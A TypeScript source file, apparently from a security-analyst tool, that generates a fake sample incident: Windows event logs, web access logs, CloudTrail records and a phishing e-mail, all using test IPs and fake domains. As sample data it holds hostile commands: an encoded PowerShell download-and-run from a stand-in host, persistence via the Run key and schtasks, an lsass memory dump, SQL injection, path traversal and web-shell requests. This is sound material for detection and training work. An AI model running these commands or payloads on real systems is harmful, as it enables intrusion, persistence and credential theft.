/* ==============================================================================
 * Copyright (c) 2024-2026 AXTO Digital Global. All rights reserved.
 * ==============================================================================
 * SECURITY ANALYST v4 — a realistic sample incident for "Load a sample": RDP
 * brute force → encoded PowerShell download → persistence → log clearing on a
 * Windows estate, plus a web attack, a cloud logging change and a phishing
 * e-mail. All indicators use documentation / test ranges and fake domains.
 * ============================================================================ */
const u16 = (s: string) => { let b = ""; for (const ch of s) { const c = ch.charCodeAt(0); b += String.fromCharCode(c & 255, c >> 8); } return btoa(b); };

const ev = (id: number, time: string, host: string, data: Record<string, string>, level = 0) =>
  `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>${id}</EventID><Level>${level}</Level><TimeCreated SystemTime="${time}"/><Computer>${host}</Computer><Channel>Security</Channel></System><EventData>${Object.entries(data).map(([k, v]) => `<Data Name="${k}">${v.replace(/&/g, "&amp;").replace(/</g, "&lt;")}</Data>`).join("")}</EventData></Event>`;

export const SAMPLE_WINDOWS = [
  ...Array.from({ length: 9 }, (_, i) => ev(4625, `2026-09-29T22:${String(10 + i).padStart(2, "0")}:0${i % 10}.000Z`, "DC01.corp.example", { TargetUserName: "administrator", IpAddress: "198.51.100.23", LogonType: "10", Status: "0xc000006d" })),
  ev(4624, "2026-09-29T22:21:44.000Z", "DC01.corp.example", { TargetUserName: "administrator", IpAddress: "198.51.100.23", LogonType: "10" }),
  ev(4688, "2026-09-29T22:24:10.000Z", "DC01.corp.example", { SubjectUserName: "administrator", NewProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    CommandLine: `powershell.exe -nop -w hidden -enc ${u16("IEX (New-Object Net.WebClient).DownloadString('http://update-cdn.example-bad.net/s.ps1')")}` }),
  ev(4688, "2026-09-29T22:25:31.000Z", "DC01.corp.example", { SubjectUserName: "administrator", NewProcessName: "C:\\Windows\\System32\\reg.exe", CommandLine: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\Public\\svchost.exe /f" }),
  ev(4688, "2026-09-29T22:26:02.000Z", "DC01.corp.example", { SubjectUserName: "administrator", NewProcessName: "C:\\Windows\\System32\\schtasks.exe", CommandLine: "schtasks /create /sc minute /mo 30 /tn \"WinUpdate\" /tr C:\\Users\\Public\\svchost.exe" }),
  ev(4688, "2026-09-29T22:27:15.000Z", "DC01.corp.example", { SubjectUserName: "administrator", NewProcessName: "C:\\Windows\\System32\\nltest.exe", CommandLine: "nltest /domain_trusts" }),
  ev(4688, "2026-09-29T22:29:40.000Z", "DC01.corp.example", { SubjectUserName: "administrator", NewProcessName: "C:\\Users\\Public\\procdump64.exe", CommandLine: "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\l.dmp" }),
  ev(4720, "2026-09-29T22:31:05.000Z", "DC01.corp.example", { SubjectUserName: "administrator", TargetUserName: "support_svc" }),
  ev(1102, "2026-09-29T22:35:12.000Z", "DC01.corp.example", {}, 4),
].join("\n");

export const SAMPLE_WEB = [
  `203.0.113.77 - - [29/Sep/2026:22:05:01 +0000] "GET /login.php?user=admin%27%20OR%201=1--&pass=x HTTP/1.1" 200 512 "-" "sqlmap/1.8"`,
  `203.0.113.77 - - [29/Sep/2026:22:05:09 +0000] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 1832 "-" "sqlmap/1.8"`,
  `203.0.113.77 - - [29/Sep/2026:22:06:44 +0000] "GET /uploads/img.php?cmd=whoami HTTP/1.1" 200 22 "-" "curl/8.5"`,
  `192.0.2.10 - - [29/Sep/2026:22:07:00 +0000] "GET /index.html HTTP/1.1" 200 5120 "-" "Mozilla/5.0"`,
].join("\n");

export const SAMPLE_CLOUD = JSON.stringify({ Records: [
  { eventTime: "2026-09-29T22:40:00Z", eventSource: "iam.amazonaws.com", eventName: "CreateAccessKey", sourceIPAddress: "198.51.100.23", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::111122223333:user/deploy" } },
  { eventTime: "2026-09-29T22:41:30Z", eventSource: "cloudtrail.amazonaws.com", eventName: "StopLogging", sourceIPAddress: "198.51.100.23", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::111122223333:user/deploy" } },
] }, null, 2);

export const SAMPLE_EMAIL = [
  "Return-Path: <bounce@mailer.example-bad.net>",
  "Received: from mx1.corp.example (mx1.corp.example [192.0.2.25]) by mail.corp.example with ESMTPS; Mon, 29 Sep 2026 21:58:04 +0000",
  "Received: from sender.example-bad.net (unknown [198.51.100.99]) by mx1.corp.example with SMTP; Mon, 29 Sep 2026 21:58:01 +0000",
  "Authentication-Results: mx1.corp.example; spf=fail smtp.mailfrom=example-bad.net; dkim=none; dmarc=fail header.from=micros0ft-support.example",
  "From: \"Microsoft 365 Security\" <alert@micros0ft-support.example>",
  "Reply-To: helpdesk-verify@example-bad.net",
  "To: it-admin@corp.example",
  "Subject: Unusual sign-in activity - verify your account",
  "MIME-Version: 1.0",
  "Content-Type: multipart/mixed; boundary=\"b1\"",
  "",
  "--b1",
  "Content-Type: text/html; charset=utf-8",
  "",
  "<p>We detected unusual sign-in activity. Verify immediately or your account will be suspended.</p><p><a href=\"http://198.51.100.99/owa/login\">https://login.microsoftonline.com/</a></p>",
  "--b1",
  "Content-Type: application/octet-stream; name=\"Security_Report.pdf.exe\"",
  "Content-Disposition: attachment; filename=\"Security_Report.pdf.exe\"",
  "Content-Transfer-Encoding: base64",
  "",
  btoa("MZ sample, not a real executable"),
  "--b1--",
  "",
].join("\r\n");
